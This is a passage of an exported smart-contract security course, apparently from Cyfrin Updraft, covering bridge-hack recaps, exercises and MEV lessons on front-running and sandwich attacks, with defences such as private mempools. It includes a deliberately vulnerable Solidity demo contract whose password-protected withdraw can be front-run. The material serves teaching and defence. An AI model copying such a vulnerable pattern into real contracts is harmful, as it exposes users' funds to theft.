          To aid you in your quest, I've left a plethora of resources and exciting ensemble of ideas for you to navigate through in our [GitHub repo](https://github.com/Cyfrin/security-and-auditing-full-course-s23).

          ![](https://cdn.videotap.com/IqGVeU9yKyYfHHDeOCnY-41.6.png)

          ## Never Stop Learning

          Now, we've been walking through these attacks, learning about them, discussing many proofs of code, and a lot of low-level calls. Remember, we are only at the beginning of our journey. Similar to any other journey you undertake, remember that what matters is your perseverance.

          > "Pretty soon, you're going to need to start jogging or running."

          The world of Blockchain is massive and ever-evolving. As we make our way through, be ready to pick up speed and adrenaline, from a casual amble to a determined sprint. I hope you are as excited as I am to continue this journey. Let's learn, explore, and grow together.
        description: 'Patrick details a gas bomb attack and how gas costs can be manipulated, with test cases.'
      -
        id: 92f33e5e-6c4d-405c-8700-d14a85995179
        type: new_lesson
        enabled: true
        title: Recap
        slug: recap
        duration: 5
        video_url: g23PPjlY5QwPaT2z8gmK1D3e02d25ztT02ZOrH01J02LGpA
        raw_markdown_url: /routes/security/7-bridges/31-recap/+page.md
        markdown_content: |-
          ---
          title: Recap
          ---



          ---

          # ![Blockchain](https://images.unsplash.com/photo-1560185004-65a33335a867?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8) GUIDE TO WALLET KEY MANAGEMENT, EVM, DIFF AND THE IMPORTANCE OF POST DEPLOYMENT IN BLOCKCHAIN

          Hello folks! You're in for an exciting ride as today we'll be diving deeper into the world of blockchain. We've covered a lot, but there's a whole universe waiting to be explored.

          Before we jump into the next section, here's an assignment. Conduct a complete competitive audit. The essence of this exercise is to immerse you in Wallet Key management, which plays a significant role in blockchain.

          There's more! We'll then delve into the depths of the Ethereum Virtual Machine (EVM), Yule, Huff and Opcodes. We will close our session with four of verification and formal verification, symbolic execution - a mandatory code review that will boost your understanding of the subject.

          Before that, let's quickly touch upon a DeFi Stablecoin and discuss the crucial step of post-deployment.

          So let's take a breath, buckle up and review what we have learned so far!

          ## A Deep Dive into EVM Diff

          Did I mention we will be exploring EVM Diff also? It's a fantastic tool that allows for comparison of different chains, say Ethereum to Optimism or Arbitrum, highlighting the nuances between these chains.

          Through EVM Diff, you can observe how the chain IDs, names, block explorers vary, and how precompiles work differently. This makes it a constructive tool to test compatibility across various EVM compatible chains.

          ![](https://cdn.videotap.com/d3RNbllZQnlENKKuA1Rp-72.28.png)

          Now, it's not all smooth sailing. There might be some hiccups, like finding some precompiles in Arbitum which are absent in EVM or Arbitum‚Äôs different transaction and signature types. Plus, their Opcodes function a bit differently, with some key Opcodes like Push Zero being unsupported on Arbitrum.

          ## Harnessing the Power of Artificial Intelligence

          ![](https://cdn.videotap.com/swSuUGyJFrnTQu8g4kzs-104.41.png)

          We haven‚Äôt delved too much into AI yet, but it's worth mentioning its relevance especially for the crypto enthusiast. Use AI, like Chat GPT, Elon Musk's new 'Find, Use Grok' to simplify things in blockchain. It can be a helpful tool when decoding intricate patterns or asking pertinent questions.

          In our roadmap, we have upcoming plans for an AI helper for [Cyfrin Updraft](https://updraft.cyfrin.io) that will be a game-changer. So, that's something to look forward to!

          ## The Importance of Checklist: A Lesson from Tenderly and The Hans

          Yes, the age-old practice of running through checklists is crucial, even in something as modern as blockchain.

          Although we didn‚Äôt discuss [Tenderly](https://tenderly.co/), it's a notable tool in this domain. Our focus was on the lessons from 'the Hans' stressing on the essentiality of having a checklist. These lists keep you on track, enabling a methodical approach to your manual review process.

          ## Understanding Precompiles, Private Keys and Signatures

          We mentioned polygon precompile during our case study, emphasizing on how crucial it is to cross-verify and how failing to do so can be costly.

          We've delved into the concept of public and private keys and how these signatures work on-chain. The importance of nonce in signature replays was discussed - they work as a one-time pass for usage ensuring your signatures don't get misused.

          We touched on several critical aspects, like undertaking low-level calls and dealing with the sign in it, and also brushed up on L1s and L2s.

          ![](https://cdn.videotap.com/wx8Rvhp7nAsmP3hocQLb-200.78.png)

          By now, you should be competent enough to write your own Proof of Concepts (POCs). The ball is in your court!

          ## Historic Bridge Hacks - Ronan, Polly Nomad and Wormhole

          We intentionally didn't touch upon these major blockchain hacks. Each of these hacks had a devastating effect, with losses running into hundreds of millions. However, they were mainly due to centralized processes, rather than any significant bug.

          Reading [Rekt.news](https://www.rekt.news/) articles about these hacks will help you comprehend the magnitude of these events. The rise of protocols like chainlink CCIP is to address these vulnerabilities, aiming to diminish our reliance on centralized technology.

          This is a lot to absorb, but remember, the world of crypto and blockchain is a non-stop learning journey. So keep exploring and evolving.
        description: 'Recap vulnerabilities including chain incompatibilities, signature replays, and bridge hacks. Emphasizes the importance of learning through PoCs.'
      -
        id: 239c896a-8965-4e4a-93dc-495f581939b1
        type: new_lesson
        enabled: true
        title: Exercises
        slug: exercises
        duration: 2
        video_url: umaQ401mT6GCPgv3q3hN3q18xsx01eu53hjeuIutYVbdQ
        raw_markdown_url: /routes/security/7-bridges/32-exercises/+page.md
        markdown_content: |-
          ---
          title: Exercises
          ---



          ---

          # Decoding Blockchain Security: Navigating Attacks, and Ensuring Web Three Safety

          The life of a security researcher is one of constant growth and learning. If you've completed this course and you're looking for the next steps and next actions you can take to better yourself in this space, we've provided some great suggestions:

          Exercises:

          1. [Damn Vulnerable DeFi Challenges](https://www.damnvulnerabledefi.xyz/) 1, 2, 4
          2. Write a tweet thread about an interesting [finding from Solodit](https://solodit.xyz/)
          3. Tweet about how you finished the hardest audit yet!
          4. Read about more historic attacks:
             - [Signature Replay](https://solodit.xyz/issues/router-signatures-can-be-replayed-when-executing-messages-on-the-destination-domain-spearbit-connext-pdf)
             - [Merkle tree signature issues](https://solodit.xyz/issues/m-14-merkle-tree-related-contracts-vulnerable-to-cross-chain-replay-attacks-code4rena-factorydao-factorydao-contest-git)
             - [Polygon Double Spend](https://medium.com/immunefi/polygon-double-spend-bug-fix-postmortem-2m-bounty-5a1db09db7f1)
             - [Nomad Bridge Hack](https://medium.com/immunefi/hack-analysis-nomad-bridge-august-2022-5aa63d53814a)

          ## Hands-on Security Research with Solodit

          Now to add a little fun to the mix. Visit Solodit, discover something that piques your interest, investigate old reported issues, and get on Twitter to share your findings! Why?

          Creating a tweet thread about your discoveries will help you consolidate knowledge, engage with peers and seasoned pros, and gain valuable insights on the topic. Not to mention, you could be setting the foundation for your personal brand in the security research field. So don‚Äôt shy away from sharing; this field thrives on collaborative knowledge sharing ‚Äì the more you share, the more you learn.

          ## The Journey Through Boss Bridge and Beyond

          Congratulations are in order! You've conquered Boss Bridge and are on the brink of completing part one of this extensive dive into blockchain security. This is hard stuff, no doubt. But you're standing tall, arms loaded with hefty concepts, embracing the weird and the wonderful in the world of blockchain security.

          Through this hurdle-ridden journey, you've gleaned a wealth of knowledge, but we're not done just yet. Let's pause for an important interlude - a pit-stop at miner extractable value (MEV).

          ## The Unskippable Chapter on Miner Extractable Value (MEV)

          ‚ÄúWhile it's optional to do the Vault guardians audit or security review, learning about the miner extractable value (MEV) is obligatory. All our contracts could be susceptible to MEV-related breaches" - this just goes to show the significance of understanding miner extractable value (MEV) in the world of blockchain.

          In the sections ahead, we'll dive into what MEV is, why it matters, and how we can fortify our contracts against potential issues stemming from it.

          Now, go ahead and take that well-deserved break, grab that cup of coffee or make that gym run. Come back refreshed, because we've got a lot more in store for you!

          ## Wrapping Up

          The world of technology is akin to a vast ocean, full of wonderful discoveries, but also home to some beastly challenges. This journey isn't meant to be a smooth sail. It's hard, and it‚Äôs meant to be. Embrace this rollercoaster ride and let the knowledge you gain empower you to make Web Three safer for all of us.

          So kudos to you for making it this far; remember to rest and prepare for the next stint. Until then, happy learning!
        description: 'Patrick details a number of exercises to take to supplement the learnings of this section!'
    type: new_section
    enabled: true
  -
    id: 1z02uLGR
    title: 'MEV & Governance'
    slug: mev-and-governance
    lessons:
      -
        id: 72251a4f-bba8-4c71-a8e6-5df9a58f0517
        type: new_lesson
        enabled: true
        title: Introduction
        slug: introduction
        duration: 1
        video_url: rcS02v21CEbLI8Nme5pkCNHzcPypVaNL6Zd1FtxKSTbo
        raw_markdown_url: /routes/security/8-mev-and-governance/1-introduction/+page.md
        markdown_content: |-
          ---
          title: Introduction
          ---

          _Follow along with this video:_

          <!-- TODO -->


          ---

          # The Power of Repetition in Cybersecurity Research

          Hello and welcome back! I certainly hope you've been embarking on the tasks and exercises that we've been laying out because their impact on your skillset cannot be overstated. As we reminded you at the beginning and will reiterate now, *repetition is the mother of skill*. The more time and effort you spend refining your abilities through practical application, the better you will get.

          ## The Importance of Exercises

          Delving into these exercises is not simply a suggestion ‚Äî it's an indispensable step towards heightening your aptitude. They serve as the stepping stones that pave the path to your mastery. So, prioritize these exercises and practice regularly. Their rewards are directly proportionate to the effort you invest.

          > "*The more you do this, the better you will get. Doing these exercises is really important and really going to level you up.*"

          Abundant in the nature of our work as cybersecurity researchers, or, as we like to say, security "research-ers", is the onus of extensive research.

          ## Learning: A Continuous Journey

          As we strive to fortify Web 3.0 and make the Internet safer, truly grasping that learning is not a destination but a continuous journey becomes a fundamental realization. In this pursuit of knowledge and endless learning, honing the skill of learning how to learn is paramount.

          > "In this quest to keep web3 safer, you will be continuously learning. You will always be on the path for learning. So learning how to learn is going to be a great skill for you."

          Everyone has a unique learning style ‚Äî what works for one person may not work for another. Therefore, it‚Äôs imperative to identify which process best suits your style of learning. Be it visual learning through infographics and diagrams, auditory learning through podcasts and audio lectures, or kinesthetic learning through hands-on, practical tasks, understanding and adapting to your preferred style can significantly contribute to your learning efficiency.

          Observe, adapt, and develop a process that works best for you. To retain as much information as possible from each lesson, experiment with different learning strategies and stick to the one with which you resonate the most.

          ## Wrapping Up

          Learning is a continuous journey, especially in the field of cybersecurity where new trends and threats emerge regularly. Embrace the grind, value the process of learning and remember, it's the repetition of efforts that lead to perfection. Each task you complete, every solution you find, and every mistake you learn from takes you one step closer to becoming a seasoned cybersecurity researcher.

          So, let us put these words into action and continue dedicating time to exercises and persistent learning. The path forward is filled with endless knowledge and it's time we kept walking on it.

          Stay safe, and keep researching!
        description: "We're introduced to the section with Patrick and encouraged to strength our skills through consistent practice."
      -
        id: ae4c5de7-7f2a-4cc1-ae5d-17419374c389
        type: new_lesson
        enabled: true
        title: Perseverance
        slug: perseverance
        duration: 3
        video_url: 1Qz2YH01L1v00UbX1g02RwfshNHnZPuUHPw1HBjca5n01Gc
        raw_markdown_url: /routes/security/8-mev-and-governance/2-perseverance/+page.md
        markdown_content: |-
          ---
          title: Perserverance
          ---

          _Follow along with this video:_

          <!-- TODO -->


          ---


          # Why are we not going to audit Vault Guardians together? 

          Originally Section Eight was designed to act as our final boss vault; an encompassing guardians security review or audit. However, upon reflection, I've decided that we're going to break this up and let you into the complexity of this code base one piece at a time. 

          And YOU my friend, you can go back and audit [Vault Guardians yourself](https://github.com/Cyfrin/8-vault-guardians-audit) :) 

          ## Vault Guardians

          <img src="/security-section-8/2-perserverance/vault-guardians.png" style="width: 100%; height: auto;" alt="vault guardians">

          So we aren't going to audit this one together, but we are going to go over some of the attack vectors you'll find in this codebase. And after we do that, you can either:

          1. Audit Vault Guardians
          2. Start a competitive [CodeHawks](https://www.codehawks.com/) competitive audit

          > "The reason that this is so big and this is such a monster of a final audit or security review is because you will get good and you will have to get good at coming to a code base and saying, I can do this. I can complete this. This looks overwhelming to me, but it's okay because I know I'm going to come out the other side triumphantly."

          ## Teamwork Makes the Dream Work

          In the vast realms of smart contract security, it's not all about solo missions. Teaming up with somebody else is an incredibly powerful move. Find a buddy in the [Codehawks/Cyfrin Discord]() to share your thoughts, brainstorm, and code together. This is not just about sharing the workload but learning how others think about attack vectors, and figuring out different strategies of how they approach this maze of codes. So sync up with someone, share your findings and grow together.

          Despite splitting up these sections, Section Eight remains our final boss. We won't go over it in this post, but don't feel left adrift. There's an audit data branch where you can check the answers and use as reference.

          ## We start with MEV

          So... To recap.

          1. We are going over some exploits in this section, in particular:
             1. MEV
             2. Governance Attacks
          2. And then, to finish part 1 of the security course, you can either:
             1. Audit Vault Guardians
             2. Start a competitive [CodeHawks](https://www.codehawks.com/) competitive audit

          So... LETS GET IT!
        description: "Patrick explains why Vault Guardians won't be covered together and encourages community collaboration!"
      -
        id: d3108829-ec37-4d38-a00f-af90d5f990d5
        type: new_lesson
        enabled: true
        title: 'MEV: Introduction'
        slug: mev-introduction
        duration: 4
        video_url: 3EveL1jnQyw1MiIlwT5qq8x4iNPqFJBAiduhGUKPNQQ
        raw_markdown_url: /routes/security/8-mev-and-governance/3-mev-introduction/+page.md
        markdown_content: |-
          ---
          title: MEV - Introduction
          ---

          _Follow along with this video:_

          <!-- TODO -->


          ---

          ## What is MEV?

          Mev stands for "Maximum Extractable Value" and it's the value that blockchain node operators and users can extract by ordering transactions in a block in a specific order. 

          In order to develop an in-depth understanding, I would highly recommend visiting [Flashbots.net](https://www.flashbots.net/), a research and development organization dedicated to counteracting the negative implications of MEV. Their 'New to MEV' page, in particular, is a fantastic learning resource.

          ## What is the mempool? 

          <img src="/security-section-8/3-mev-introduction/regular-transaction.png" style="width: 100%; height: auto;" alt="regular transaction">

          When a transaction is initiated, it is directed to a specific node which, instead of immediately integrating it into its block, places it into its 'memory pool', or 'mempool'. This constitutes the lower tier of workings that enable blockchain.

          <img src="/security-section-8/3-mev-introduction/mempool.png" style="width: 100%; height: auto;" alt="mempool">

          As we know, Ethereum is a Proof-of-stake blockchain and the nodes essentially "take turns" building blocks for the blockchain. So if you send your transaction to a single node, the node will have to wait until it's that nodes turn to include your transaction! This could take months! So what the node does is that accepts your transaction, and will often "fan out" your transaction to other nodes. 

          If it's one of the other nodes turns to build the block, if you sent enough of a tip (gas) with your transaction, the node will include your transaction in the block.

          So this "mempool" is like a waiting room for transactions.

          ## Front-running

          <img src="/security-section-8/3-mev-introduction/mev.svg" style="width: 100%; height: auto;" alt="front-running">

          Suppose you're a malicious user and want to use this to your advantage. You have the ability to scan the mempool, essentially predicting future transactions. Let's say User A is malicious, and sees someone make a transaction that is going to make them $100. 

          ...Well User A might just say "Hey! I want to make $100!"

          So what User A can do is something called *front-running*. They can send their *own* transaction *ahead* of your transaction to extra some value. The only reason they are able to extract this value is because they were able to see your transaction ahead of time. 

          Front-running is one of the most common forms of MEV.
        description: 'Patrick introduces and details the concept of MEV and MEV bots.'
      -
        id: 79a5fc3d-3b95-40d2-a993-07ac09a132cb
        type: new_lesson
        enabled: true
        title: 'MEV: Minimized'
        slug: mev-minimized
        duration: 1
        video_url: j1F002AUlf7n4FGid4AwVqOPtNm9FjsOOffo01iifRjgY
        raw_markdown_url: /routes/security/8-mev-and-governance/4-mev-minimized/+page.md
        markdown_content: |-
          ---
          title: MEV - Minimized
          ---

          _Follow along with this video:_

          <!-- TODO -->


          ---

          # MEV - Minimized

          We can take a look at this image to see a minimized visual representation of what MEV looks like. In specific, this kind of MEV is known as "front-running".

          <img src="/security-section-8/4-mev-minimized/minimized.png" style="width: 100%; height: auto;" alt="regular transaction">

          # MEV - Everywhere

          But not only that, ALL of our sections in the security course have been vulnerable to MEV attacks! Let's go over them...
        description: 'Patrick discusses examples of MEV vulnerabilities as detailed in the sc-exploits-minimized repo.'
      -
        id: a8e7cd03-4078-468e-8bd1-6daaa2e043cc
        type: new_lesson
        enabled: true
        title: 'MEV: Puppy Raffle'
        slug: mev-in-puppy-raffle
        duration: 2
        video_url: pVn6Z3G3nmIHmvlHnGCS00hVmBHpjkPUBn02m8zoMDMdk
        raw_markdown_url: /routes/security/8-mev-and-governance/5-mev-in-puppy-raffle/+page.md
        markdown_content: |-
          ---
          title: MEV - Minimized
          ---

          _Follow along with this video:_

          <!-- TODO -->


          ---

          # Front Running

          ## The Puppy Raffle Demo

          Our Puppy Raffle's core function is `selectWinner`, which allows users to select a winner in any given transaction. While this `selectWinner` transaction is in flight (pending confirmation), it is readable by other parties involved in the transaction. This means they can potentially see that the impending winner is user A (let's call them MevBot for the sake of argument) and then strategize accordingly.

          ```javascript
          function selectWinner() { // Winner selection codewinner = User A
          ```

          ## When Front Running Strikes

          <img src="/security-section-8/5-puppy-mev/puppy-mev.png" style="width: 100%; height: auto;" alt="puppy raffle mev">

          Imagine user B - let's call them the Frontrunner - realizing that they're not about to win the raffle. Naturally, they may not want to continue participating in it. Sensing impending loss, Frontrunner springs into action.

          *A simple plan*: Before the `selectWinner` transaction goes through, they initiate another function - `refund` - which allows them to pull out their betted money.

          ```javascript
          function refund() {// Refund code// User B pulls out their betted money}
          ```

          They are essentially saying, '*No, not on my watch! I'm getting my refund.*' And voila, Frontrunner's transaction gets refunded, while the `selectWinner` function will eventually be executed resulting in (User A) receiving less money. Why? Because Frontrunner (User B) had effectively front-run them and withdrew their betted money!

          ## The Full Example: Implications of Front Running

          Let's add some numbers to visualize this more clearly:

          1. Let's say the Puppy Raffle has a total of 10 ETH.
          2. Frontrunner sees that User A is about to win.
          3. Frontrunner and all their peers launch their own transactions to call the `refund` function, effectively withdrawing a substantial portion of the betted money.
          4. Suddenly, there are only 1 ETH left in the pool, instead of the initial 10 ETH.
          5. Finally, the `selectWinner` transaction goes through, and MevBot ends up with a meager prize of 1 ETH instead of the expected 10 ETH.

          Here, front running literally robs User A of their full winnings. Frontrunner ‚Äî observing the transaction in the mempool and acting just in time ‚Äî was able to drastically alter the outcome.

          > "The ability to 'spy' on pending transactions opens up the possibility for opportunists to front-run your transactions. They can swiftly act in ways that are in their favor but can potentially be detrimental to others, as the 'Puppy Raffle' scenario demonstrates."
        description: 'MEV Vulnerabilities in Puppy Raffle discussed!'
      -
        id: a1e5c3a3-9f17-46f0-9146-32b2842cd63f
        type: new_lesson
        enabled: true
        title: 'MEV: TSwap'
        slug: mev-t-swap
        duration: 2
        video_url: V3x8jRm79qgJUvw01SHO91EuBX2W1ARtHp4obLRTnOog
        raw_markdown_url: /routes/security/8-mev-and-governance/6-mev-t-swap/+page.md
        markdown_content: |-
          ---
          title: MEV - T-Swap
          ---

          _Follow along with this video:_

          <!-- TODO -->


          ---

          ## Exploring the T Swap Issue

          While working with T swap, there was a prominent issue that surfaced - an issue which was rooted right in the `deposit` function. The problematic player at hand was an unused `deadline` parameter.

          To find the culprit, we navigated to the `SRC` and inspected the `TswapPool.sol` in T swap, where we saw the troublesome `deadline` input parameter laying idly in the `deposit` function.

          ```javascript
              function deposit(
                  uint256 wethToDeposit,
                  uint256 minimumLiquidityTokensToMint,
                  uint256 maximumPoolTokensToDeposit,
                  uint64 deadline
              )
          ```

          And, you ask, what was the consequence of this unutilized parameter? Well, its existence led to a scenario where a deposited transaction could potentially be delayed without encountering a timeout, thereby enabling 'front running'. 

          A node who receives this transaction could hold your deposit transaction until it benefits them to deposit you in!

          ## Understand the Impact: An Simple Illustration

          <img src="/security-section-8/6-tswap-mev/t-swap-mev.png" style="width: 100%; height: auto;" alt="t-swap mev">

          Let's understand the implications with an example. Suppose a user, 'User A', initiates a `deposit` call. However, this call was sent to a particular node connected to an MEV bot, let's call this 'User B'.

          The node, upon receiving the transaction, realizes that the deposit from 'User A' would dwindle its share in the pool. Just by chance, it also knows of certain larger imminent transactions, which will result in big fees. Therefore, the node chooses to stall the transaction from 'User A' temporarily, permitting 'User B' or the MEV bot to collect the big fees ‚Äì effectively front running 'User A'.

          ## Introducing 'Sandwich attacks'

          Beyond just front running, there are worst forms of deceiving manoeuvres - one such issue that potentially arises in T swap is known as 'Sandwich attacks'. These are when someone front-runs you, and then also "back runs" you.

          ```
          -> Their Transaction
          -> Your Transaction
          -> Their Transaction
          ```

          They "sandwich" you between two of their transactions. One such example looks like such:

          1. You send a TX to buy 1 ETH for 1,000 DAI
          2. An MEV bot sees this:
             1. Buys up all the ETH, pumping the price to 2,000
             2. Your transaction goes through, buying 1 ETH for 2,000 DAI
             3. They then sell their ETH for it's inflated price 

          Seeing your big order of 1 ETH come in, the MEV bot manipulated the market so you paid more, and they profited.
        description: 'MEV Vulnerabilities in TSwap discussed!'
      -
        id: 0435db83-e395-44dd-9c86-07fd2c736a43
        type: new_lesson
        enabled: true
        title: 'MEV: ThunderLoan'
        slug: mev-thunder-loan
        duration: 2
        video_url: gxPmR02VCgIdep12CnS6OxSh4Lcl2C801uHO2WI4hF02bU
        raw_markdown_url: /routes/security/8-mev-and-governance/7-mev-thunder-loan/+page.md
        markdown_content: |-
          ---
          title: MEV - Thunder Loan
          ---

          _Follow along with this video:_

          <!-- TODO -->


          ---

          Speaking of Sandwich Attacks, that's exactly what happens in the Thunder Loan protocol. 

          ## An Introduction to Thunderloan and Potential MEV Issues

          The Thunderloan protocol is a platform where users can take out flash loans, with a fee currently standing at ten USDC. These fees are directly withdrawn from TSWAP pools. However, the protocol's design makes it susceptible to MEV strategies. 

          ## The Sandwich Attack: A Closer Look

          <img src="/security-section-8/7-mev-thunder-loan/thunder-loan-mev.png" style="width: 100%; height: auto;" alt="t-swap mev">


          Here's how it goes:

          1. User A makes a request to the Thunderloan protocol for a flash loan.
          2. Seeing the incoming flash loan request, User B, decides to exploit the situation. User B doesn't just want the fee to be high, they want it way higher!
          3. User B then front runs the flash loan function, and spikes the price on Uniswap by taking out a flash loan *themselves* to make the price go higher. Effectively, this swap alters the balances from the initial ten USDC and one ETH to highly skewed figures: perhaps 0.1 ETH and an astronomical amount of USDC (let's say a billion). Since the fee is derived from the T-Swap pool, the Thunder Loan platform now has a way bigger fee, that the user wasn't aware of. 
          4. Then, after collecting the fee, User B swaps back to the original ratio of 10 USDC and 1 ETH.

          ## The Takeaway

          > "Understanding the landscape of MEV vulnerabilities, and how it can lead to 'Sandwich Attacks,' is paramount for DeFi users. Only by identifying potential threats can we begin to devise methods to avoid being sandwiched."

          The above exploration of the potential MEV issue in Thunderloan paints a broader picture of potential vulnerabilities in DeFi protocols. By shining light on this issue, we can aspire to ensure safer transactions and reduce the adverse impacts of MEV exploits.
        description: 'MEV Vulnerabilities in Thunder Loan discussed!'
      -
        id: 0856ee94-ef38-45d1-91a3-0b56194b3338
        type: new_lesson
        enabled: true
        title: 'MEV: BossBridge'
        slug: mev-boss-bridge
        duration: 1
        video_url: Y00YoudniEn00sg01LlzRWNA2OFBUdTxipEXJh001NPQ9vE
        raw_markdown_url: /routes/security/8-mev-and-governance/8-mev-boss-bridge/+page.md
        markdown_content: |-
          ---
          title: MEV - Boss Bridge
          ---

          _Follow along with this video:_

          <!-- TODO -->


          ---

          ## MEV - Boss Bridge

          Now you're starting to see the picture, and the Boss Bridge MEV becomes clear. 

          <img src="/security-section-8/8-mev-boss-bridge/mev-boss-bridge.png" style="width: 100%; height: auto;" alt="boss bridge mev">

          If you send a transaction with your signature on-chain, someone can easily see that transaction in the mempool, and then send their own transaction with your signature!

          ## Prevention

          To prevent this, we can do something similar to the Signature Replay protection, where we add a nonce, make sure the first time it's called with the signer, etc.
        description: 'MEV Vulnerabilities in Boss Bridge discussed!'
      -
        id: db99bec6-0e4b-4b88-88b1-af410e917a5d
        type: new_lesson
        enabled: true
        title: 'MEV: LIVE'
        slug: mev-live
        duration: 12
        video_url: MRpS3YaA1Tczbj5qZ1006xq01GcSFosgwmb3wUUS8LgcI
        raw_markdown_url: /routes/security/8-mev-and-governance/9-mev-live/+page.md
        markdown_content: |-
          ---
          title: MEV - LIVE
          ---

          _Follow along with this video:_

          <!-- TODO -->


          ---

          # Now, we are going to watch a video of me getting front-ran, LIVE

          Here is [the code we are going to use to see it](https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/MEV/Frontran.sol)

          ```javascript
          // SPDX-License-Identifier: MIT
          pragma solidity 0.8.20;

          contract FrontRan {
              error BadWithdraw();

              bytes32 public s_secretHash;

              event success();
              event fail();

              constructor(bytes32 secretHash) payable {
                  s_secretHash = secretHash;
              }

              function withdraw(string memory password) external payable {
                  if (keccak256(abi.encodePacked(password)) == s_secretHash) {
                      (bool sent,) = msg.sender.call{value: address(this).balance}("");
                      if (!sent) {
                          revert BadWithdraw();
                      }
                      emit success();
                  } else {
                      emit fail();
                  }
              }

              function balance() external view returns (uint256) {
                  return address(this).balance;
              }
          }
          ```

          Watch the video to see:
          1. Me get front-ran
          2. How we prevent it with [Flashbots Protect](https://docs.flashbots.net/flashbots-protect/overview)
        description: 'Patrick demonstrates himself getting front ran in a recording of a live example.'
      -
        id: 2a8ee81a-1be3-46f5-ba4e-cca550526af3
        type: new_lesson
        enabled: true
        title: 'MEV: Live AGAIN'
        slug: mev-live-again
        duration: 6
        video_url: tt022yw1eZE34rM01tk5ffoQEMrVE6vw9ZnsEyjrRRBjQ
        raw_markdown_url: /routes/security/8-mev-and-governance/10-mev-live-again/+page.md
        markdown_content: |-
          ---
          title: MEV - Live AGAIN!
          ---

          _Follow along with this video:_

          <!-- TODO -->


          ---

          # Can we obfuscate the transaction?

          So, a lot of people saw me do this and started to theorize.

          - "Hey, could we obfuscate the transaction?"
          - "What if there was another contract in the way?"
          - "What if it was written in assembly?"

          And I'm here to tell you, it doesn't matter. The bots simulate the transaction, and pick out the parts they can use to make money. 

          We look at a [modified example](https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/MEV/Bouncer.sol) where we add a "bouncer" contract to try to "block" the transactions.

          <img src="/security-section-8/10-bouncer/bouncer.png" style="width: 100%; height: auto;" alt="bouncer">

          ```javascript
          // SPDX-License-Identifier: MIT
          pragma solidity 0.8.20;

          interface IFrontRan {
              function withdraw(string memory password) external;
          }

          contract Bouncer {
              error Bouncer__NotOwner();
              error Bouncer__DidntMoney();

              address s_owner;
              address s_frontRan;

              constructor(address frontRan) payable {
                  s_owner = msg.sender;
                  s_frontRan = frontRan;
              }

              function go(string memory password) external {
                  if (msg.sender != s_owner) {
                      revert Bouncer__NotOwner();
                  }
                  IFrontRan(s_frontRan).withdraw(password);
                  (bool success,) = payable(s_owner).call{value: address(this).balance}("");
                  if (!success) {
                      revert Bouncer__DidntMoney();
                  }
              }

              receive() external payable {}
          }
          ```

          So, watch the video above to see, will this contract help block the MEV bots?
        description: 'Patrick highlights the ability of MEV bots to bypass attempts at blocking them, even with added complexity or obscurity in a smart contract.'
      -
        id: f89212c6-f10f-42ec-a5f1-cdfeccb54041
        type: new_lesson
        enabled: true
        title: 'Case Study: Pashov'
        slug: case-study-pashov
        duration: 24
        video_url: CVVQOfXFAO01PFuY5YC01L73sxl2AqmLSmeBZZ026W2azM
        raw_markdown_url: /routes/security/8-mev-and-governance/11-case-study-pashov/+page.md
        markdown_content: |-
          ---
          title: MEV Case Study - Pashov
          ---

          _Follow along with this video:_

          <!-- TODO -->


          ---

          To walk us through some real-world reports where MEV was reported, we have guest lecturuer [Pashov](https://twitter.com/pashovkrum) to walk us through! 


          <img src="/security-section-8/11-pashov/pashov.png" style="width: 100%; height: auto;" alt="pashov">
        description: 'The legendary Pashov walks us through a case study of MEV Exploitation.'
      -
        id: 1323222f-b81d-4173-b237-f43b130d3042
        type: new_lesson
        enabled: true
        title: 'MEV: Prevention'
        slug: mev-prevention
        duration: 4
        video_url: Bl73cdulINgQh4sc3J4xoxLUcJ300qaxmp2MXb00NvlZM
        raw_markdown_url: /routes/security/8-mev-and-governance/12-mev-prevention/+page.md
        markdown_content: |-
          ---
          title: MEV - Prevention
          ---

          _Follow along with this video:_

          <!-- TODO -->


          ---

          ## Designing For Protection

          Our first line of defense against MEV is to refine our designs. To illustrate this, let's revisit a puppy raffle sample.

          We can shield our raffle from this kind of attack by updating our Solidity code. A simple solution would be to introduce a function, like `endRaffle`, which signifies the completion of the raffle. Once a raffle is `ended` it will enter a new state, where no one can refund or do anything until a winner is picked. Here‚Äôs an example of how we can incorporate additional protections into our smart contract:

          <img src="/security-section-8/12-mev-prevention/endRaffle.png" style="width: 100%; height: auto;" alt="pashov">


          Our contract now includes a `refund` function that checks if the raffle has ended - if it has, it reverts the function, making it impossible for users to refund their bets after peeking into the mempool.

          ## Private or Dark Mempool

          When the designs have been beefed up, the next step to consider is the use of a private or "dark" mempool, such as [Flashbots Protect](https://docs.flashbots.net/flashbots-protect/overview), MEV Blocker, or a secure RPC.

          <img src="/security-section-8/12-mev-prevention/flashbots.png" style="width: 100%; height: auto;" alt="pashov">

          Instead of submitting your transaction to a public mempool, you can send your transaction to this private mempool. Unlike the public mempool, this keeps the transaction for itself until it's time to post it on the chain.

          Despite its pros, the private mempool requires you to trust that it will maintain your privacy and avoid front-running. Another downside is the slower transaction speed. If you're curious, you can observe this in action by adding an RPC from Flashbots Protect to your MetaMask.



          As security experts, we should always be advising protocols how they can defend their users against MEV.
        description: 'Learn how to improve contract design, using private mempools, and implementing slippage protection against MEV bots.'
      -
        id: d66d4e52-3711-4f09-b765-2a6ea6df136d
        type: new_lesson
        enabled: true
        title: 'MEV: Recap'
        slug: mev-recap
        duration: 2
        video_url: ohCKCC01cUCNlj0202cS36Z4TDdSi01SgvfGuNcLkuOAvQk
        raw_markdown_url: /routes/security/8-mev-and-governance/13-mev-recap/+page.md
        markdown_content: |-
          ---
          title: MEV - Prevention
          ---

          _Follow along with this video:_

          <!-- TODO -->


          ---

          # Understanding Mev and How to Mitigate Its Impact

          Mev refers to the potential reward that a miner, node, or bot could glean from ordering transactions. They often use the information of what's coming from the mempool to make those ording choices. 

          ## Types of Mev Attacks
          - Front-running
          - Backrunning
          - Sandwich 
          - Many more...

          There are various ways through which Mev can be exploited to benefit the entity spotting the transaction. Some of the most common types of Mev attacks include:

          - *Front Running*: This occurs when an entity spots a pending transaction and then acts quickly to execute another transaction before the victim transaction hits. 
          - *Sandwich Attacks*: Similar to front running, this involves an attacker boxing in a user's transaction with their transactions on either side. 

          ## Protecting Against Mev Attacks

          While the realities of Mev can be daunting, there are ways to mitigate its impact:

          1. **Better Design** ‚Äì Constructing the transaction in a manner that makes it harder for bots to gain useful knowledge. This might involve masking critical information or employing other strategic measures.
